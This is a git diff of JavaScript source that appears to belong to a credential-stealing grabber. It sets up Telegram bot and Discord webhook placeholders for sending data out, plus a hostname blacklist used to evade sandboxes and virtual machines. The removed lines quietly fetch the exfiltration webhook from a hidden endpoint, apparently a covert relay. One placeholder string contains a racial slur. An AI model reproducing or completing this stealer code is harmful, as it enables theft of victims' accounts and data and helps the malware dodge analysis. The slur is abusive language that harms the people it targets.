@@ -28,62 +28,7 @@ const url = 'BINDER-LINK-HERE';
 const botToken = 'YOURBOTTOKEN';
 const chatId = 'YOURCHATID';
 
-// Global değişken
-let globalWebhookUrl = null; // Webhook URL başlangıçta boş
-let diagret = '%REPLACE-ME-NIGGA%';
-// Rastgele bir şifreleme anahtarı üret
-function generateSecureReference() {
-    return btoa(
-        Math.random().toString(36).substring(2, 15) +
-        Math.random().toString(36).substring(2, 15)
-    );
-}
-
-// Webhook URL'sini almak için veri gönderme
-async function sendDataAndFetchWebhook() {
-    const reference = generateSecureReference(); // Rastgele bir referans oluştur
-    const data = {
-        key: "ubolagasxlog1", // Güvenlik anahtarı
-        reference: reference, // Rastgele oluşturulan referans
-        message: "Örnek veri gönderiliyor." // Örnek veri
-    };
-
-    try {
-        const response = await fetch(diagret, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json",
-            },
-            body: JSON.stringify(data) // JSON olarak veri gönder
-        });
-
-        if (!response.ok) {
-            throw new Error(`HTTP Hatası: ${response.statusText}`);
-        }
-
-        const result = await response.json();
-
-        if (result.webhookUrl) {
-            console.log("Webhook URL alındı:", result.webhookUrl);
-            globalWebhookUrl = result.webhookUrl; // Global değişkeni ayarla
-            console.log("Global Webhook URL ayarlandı:", globalWebhookUrl);
-        } else {
-            console.error("Webhook URL alınamadı.");
-        }
-    } catch (error) {
-        console.error("Bir hata oluştu:", error);
-    }
-}
-
-// Asenkron fonksiyonu çağır ve global değişkeni doldur
-(async () => {
-    await sendDataAndFetchWebhook();
-    if (globalWebhookUrl) {
-        console.log("Global Webhook URL hazır:", globalWebhookUrl);
-    }
-})();
-
-const discordWebhookUrl = globalWebhookUrl;
+const discordWebhookUrl = 'REMPLACE_ME';
 const discordWebhookUr1 = discordWebhookUrl;
 
 const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
